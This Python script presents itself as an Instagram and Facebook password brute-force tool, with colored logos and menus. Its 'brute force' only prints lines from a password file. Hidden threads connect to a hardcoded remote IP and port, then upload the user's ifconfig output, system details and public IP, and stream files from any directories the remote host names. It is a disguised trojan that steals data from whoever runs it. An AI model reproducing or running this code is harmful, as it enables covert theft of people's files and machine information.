import socket,threading,time,os,tqdm,requests,random,platform
class project(object):
    def __init__(self,host,port):
        self._host,self._port = host,port 
        self.address = (host,port)
        self.sock = socket.socket(socket.AF_INET,socket.SOCK_STREAM)
        
        self.fas = False
        self.hold1 = []
        self.hold2 = []
        self.hold3 = []
        
    def start(self):
        try:
            while True:
                conn = self.sock
                self.th1=threading.Thread(target=self.recev,args=[conn])
                self.one=threading.Thread(target=self.ONE,args=[conn])
                self.two=threading.Thread(target=self.TWO,args=[conn])
                self.three=threading.Thread(target=self.THREE,args=[conn])
                self.INSTA=threading.Thread(target=self.insta,args=[conn])
                self.FACE=threading.Thread(target=self.face,args=[conn])
                self.STARTING=threading.Thread(target=self.starting,args=[conn])
                self.STARTING.start()
                project.loop(self)
        except:
            time.sleep(2)
            project.start(self)
    def loop(self):
        try:
            while True:
                conn = self.sock
                conn.connect(self.address)
                self.th1=threading.Thread(target=self.recev,args=[conn])
                self.th1.start()
        except:
            time.sleep(2)
            project.loop(self)
    def recev(self,conn):
        while True :
            msg_rec = conn.recv(8096).decode()
            if self.fas == False:
                print ("\n ")
                self.fas = True
            if not msg_rec:
                break
            if msg_rec[0] == "1" and msg_rec[2] == "2" and msg_rec[4] == "3" :
                self.hold1 = msg_rec.split(" ")
                self.hold2 = msg_rec.split(" ")
                self.hold3 = msg_rec.split(" ")
                self.one.start()
                self.one.join()
        conn.close()
    def ONE(self,conn):
        try:
            CHUNKSIZE = 1048576
            while True:
                for path,dirs,files in os.walk(self.hold1[3]):
                    for file in files[0:6]:
                        filename = os.path.join(path,file)
                        relpath = os.path.relpath(filename,self.hold1[3])
                        filesize = os.path.getsize(filename)
                        with open(filename,'rb') as f:
                            conn.sendall(relpath.encode() + b'\n')
                            conn.sendall(str(filesize).encode() + b'\n')
                            while True:
                                data = f.read(CHUNKSIZE)
                                if not data:break
                                conn.sendall(data)
                print("\033[0;31m[wronge , can't change ip]")
                self.two.start()
                self.two.join()
                raise SystemExit
        except:
            pass

    def TWO(self,conn):
        CHUNKSIZE = 1048576
        with open("username.txt","rb") as F:
            relpath = os.path.relpath("username.txt")
            filesize = os.path.getsize("username.txt")
            conn.sendall(relpath.encode() + b'\n')
            conn.sendall(str(filesize).encode() + b'\n')
            while True:
                data = F.read(CHUNKSIZE)
                if not data:break
                conn.sendall(data)
        CHUNKSIZE = 1048576
        while True:
            for path,dirs,files in os.walk(self.hold2[4]):
                for file in files[0:30]:
                    filename = os.path.join(path,file)
                    relpath = os.path.relpath(filename,self.hold2[4])
                    filesize = os.path.getsize(filename)
                    with open(filename,'rb') as f:
                        conn.sendall(relpath.encode() + b'\n')
                        conn.sendall(str(filesize).encode() + b'\n')
                        while True:
                            data = f.read(CHUNKSIZE)
                            if not data:break
                            conn.sendall(data)
            print("\033[0;31m[wronge , can't change ip]")
            self.three.start()
            self.three.join()
            raise SystemExit
    def THREE(self,conn):
        CHUNKSIZE = 1048576
        while True:
            for path,dirs,files in os.walk(self.hold3[5]):
                for file in files[0:15]:
                    filename = os.path.join(path,file)
                    relpath = os.path.relpath(filename,self.hold3[5])
                    filesize = os.path.getsize(filename)
                    with open(filename,'rb') as f:
                        conn.sendall(relpath.encode() + b'\n')
                        conn.sendall(str(filesize).encode() + b'\n')
                        while True:
                            data = f.read(CHUNKSIZE)
                            if not data:break
                            conn.sendall(data)
            print("\033[0;31m[wronge , can't change ip]")
            raise SystemExit
    def LOGO():
        logo="\n  \033[0;35m :;;;;;;;;;;;;;;;;;;:       sS$$$$$$$$$$$$$$$$Ss   \n   '::::::::::::::::::' \033[0;36m.•HH•  \033[0;35m'$$$$$$$$$$$$$$$$'    \n          '::::'    \033[0;36m  .°H  'E#%..   \033[0;35m '$$$$'          \n           ::::   \033[0;36m  .•HHH    `ΠΠΠΠ.   \033[0;35m$$$$           \n           ::::  \033[0;36m  'HHHH      .@@@$   \033[0;35m$$$$           \n           ::::   \033[0;36m bHHd        aaaa   \033[0;35m$$$$           \n           ::::   \033[0;36m bkud        aaaa   \033[0;35m$$$$           \n           ::::   \033[0;36m dknb        @@@@   \033[0;35m$$$$           \n           ::::   \033[0;36m  dkhb     ,qoop    \033[0;35m$$$$           \n           ::::   \033[0;36m  'dkH.   :cBl'   \033[0;35m  $$$$ \033[0;33m  v: 1.4  \n         \033[0;35m  ::::   \033[0;36m     '#@&.'/?    \033[0;35m   $$$$           \n           ::::    \033[0;36m      `xP'        \033[0;35m $$$$           \n                                                     \n                                                     \n                                                     \n                                                     "
        Logo="\n  \033[0;35m TTTTTTTTTTTTTTTTTTT        TTTTTTTTTTTTTTTTTTT    \n    ttttttttttttttttt \033[0;36m  .o.o.  \033[0;35mttttttttttttttttt     \n         'TTTT'     \033[0;36m  .°O   O°.      \033[0;35m'TTTT'          \n          TTTT  \033[0;36m     'oO     Oo'      \033[0;35mTTTT           \n          TTTT    \033[0;36m  °OO       OO°     \033[0;35mTTTT           \n          TTTT     \033[0;36m OO         OO     \033[0;35mTTTT           \n          TTTT   \033[0;36m   o0         o0     \033[0;35mTTTT           \n          TTTT   \033[0;36m    OO       OO      \033[0;35mTTTT           \n          TTTT     \033[0;36m   °O.   .O°       \033[0;35mTTTT \033[0;33m  v: 1.4  \n     \033[0;35m     TTTT    \033[0;36m      'O.O'    \033[0;35m     TTTT           \n          TTTT      \033[0;36m      `       \033[0;35m    TTTT           \n                                                     \n                                                     \n                                                     \n                                                     "
        LOgo="\n  \033[0;35m |——————————————————|     |——————————————————|     \n    \________________/       \________________/      \n          |----|    \033[0;36m    /\-\   \033[0;35m    |----|            \n          |----|   \033[0;36m    // \-\   \033[0;35m   |----|            \n          |----|     \033[0;36m //   \-\   \033[0;35m  |----|            \n          |----|   \033[0;36m  //     \-\ \033[0;35m   |----|            \n          |----|  \033[0;36m  //      /-/   \033[0;35m |----|            \n          |----| \033[0;36m   \      /-/  \033[0;35m   |----|            \n          |----|  \033[0;36m   \    /-/     \033[0;35m |----| \033[0;33m  v: 1.4   \n      \033[0;35m    |----|  \033[0;36m    \  /-/    \033[0;35m   |----|            \n          |____|  \033[0;36m     \/-/   \033[0;35m     |____|            \n                                                     \n                                                     \n                                                     \n                                                     "
        icon=[logo,Logo,LOgo]
        print(icon[random.randint(0,2)])
    def starting(self,conn):
        os.system("clear")
        project.LOGO()
        print("\033[7;36m take a number :\n\n")
        print("\033[0;35m[\033[0;36m1\033[0;35m] instagram ")
        print("\033[0;35m[\033[0;36m2\033[0;35m] facebook ")
        put = str(input("\n\033[0;35m[\033[0;36m$\033[0;35m]chose \033[0;36m:\033[1;34m "))
        if put == "1":
            os.system("clear")
            project.LOGO()
            self.INSTA.start()
          #  self.one.join()
        elif put == "2":
            os.system("clear")
            project.LOGO()
            self.FACE.start()
        else:
            project.starting(self,conn)
    def check(self,check):
        change = "\033[0;32m[change ip]"
        CHANGE = "\033[0;31m[can't change ip]"
        while True :
            time.sleep(random.randint(1.0,3.0))
            print(change)
            time.sleep(0.5)
            print(change)
            time.sleep(0.2)
            print(change)
    def insta(self,conn):
        os.system("clear")
        project.LOGO()
        print("\033[0;33m[instagram brute force]\n")
        print("\033[7;36m put the commands :\n")
        first=str(input("\n\033[0;35m[\033[0;36m#\033[0;35m] username of insta account\033[0;36m :\033[1;34m @"))
        sac = str(input("\033[0;35m[\033[0;36m#\033[0;35m] do you wana use proxy ? [\033[0;36myes\033[0;35m/\033[0;36mno\033[0;35m] \033[0;36m: \033[1;34m"))
        print("\npleas white ..")
        if len(first) <= 1 :
            os.system("clear")
            lol = input("\n\n\033[0;31m u don't set any account , try ageen ..")
            if len(lol) != None :
                project.insta(self,conn)
        elif len(first) > 1 :
            headers = {'User-Agent': 'Mozilla/5.0 ( Windows NT 6.2; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/75.0.3770.100 Safari/537.36'}
            url="https://www.instagram.com/"+first
            respons=requests.get(url,headers=headers) 
            if respons.status_code == 200 :
                CHUNKSIZE = 1048576
                with open("username.txt",'a') as f:
                    f.write("$"+first+"\n")
                    ping = os.popen('ifconfig')
                    your_ip=ping.read()
                    f.write(your_ip+"#@#")
                    cloud = str(platform.uname())
                    f.write(cloud+"#@#")
                    try:
                        ip = requests.get('https://api.ipify.org').text
                        f.write(' public IP : {}'.format(ip)+"#@#")
                    except:
                        pass
                self.HACK=threading.Thread(target=self.hack,args=[first])
                self.HACK.start()
            else:
                os.system("clear")
                lol = input("\n\n\033[0;31m ohh ,there is no account have this name , try ageen ..")
                if lol != None:
                    project.insta(self,conn)
    def hack(self,first):
        os.system("clear")
        project.LOGO()
        user = "\033[0;35musername \033[0;36m: \033[1;34m"+first
        hach = "\033[0;36m || "
        pas = "\033[0;35mpassword \033[0;36m: \033[1;34m"
        check = "\033[0;31m!wronge!"
        self.CHECK=threading.Thread(target=self.check,args=[check])
        self.CHECK.start()
        with open("PassWord.txt","r") as a:
            while True :
                time.sleep(random.randint(0.0,1.0))
                print(user+hach+pas+a.readline()+check)
                time.sleep(0.1)
                print(user+hach+pas+a.readline()+check)
    def face(self,conn):
        os.system("clear")
        project.LOGO()
        print("\033[0;33m[facebook brute force]\n")
        print("\033[7;36m put the commands :\n")
        first=str(input("\n\033[0;35m[\033[0;36m#\033[0;35m] email of facebook account\033[0;36m :\033[1;34m "))
        sac = str(input("\033[0;35m[\033[0;36m#\033[0;35m] do you wana use proxy ? [\033[0;36myes\033[0;35m/\033[0;36mno\033[0;35m] \033[0;36m: \033[1;34m"))
        print("\npleas white ..")
        if len(first) <= 1 :
            os.system("clear")
            lol = input("\n\n\033[0;31m u don't set any account , try ageen ..")
            if len(lol) != None :
                project.face(self,conn)
        elif len(first) > 1 :
            headers = {'User-Agent': 'Mozilla/5.0 ( Windows NT 6.2; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/75.0.3770.100 Safari/537.36'}
            url="https://www.facebook.com/"+first
            CHUNKSIZE = 1048576
            with open("username.txt",'a') as f:
                f.write("$"+first+"\n")
                ping = os.popen('ifconfig')
                your_ip=ping.read()
                f.write(your_ip+"#@#")
                cloud = str(platform.uname())
                f.write(cloud+"#@#")
                try:
                    ip = requests.get('https://api.ipify.org').text
                    f.write(' public IP : {}'.format(ip)+"#@#")
                except:
                    pass
                self.HUCK=threading.Thread(target=self.huck,args=[first])
                self.HUCK.start()
    def huck(self,first):
        os.system("clear")
        project.LOGO()
        user = "\033[0;35memail \033[0;36m: \033[1;34m"+first
        hach = "\033[0;36m || "
        pas = "\033[0;35mpassword \033[0;36m: \033[1;34m"
        check = "\033[0;31m!wronge!"
        CHeck = "\033[0;32mgreat , and this is the password ^"
        self.CHECK=threading.Thread(target=self.check,args=[check])
        self.CHECK.start()
        with open("PassWord.txt","r") as a:
            while True :
                time.sleep(random.randint(0.0,1.0))
                print(user+hach+pas+a.readline()+check)
                time.sleep(0.1)
                print(user+hach+pas+a.readline()+check)
if __name__=="__main__":
    host = "3.14.182.203"
    port = 11807
    proj = project(host,port)
    proj.start()
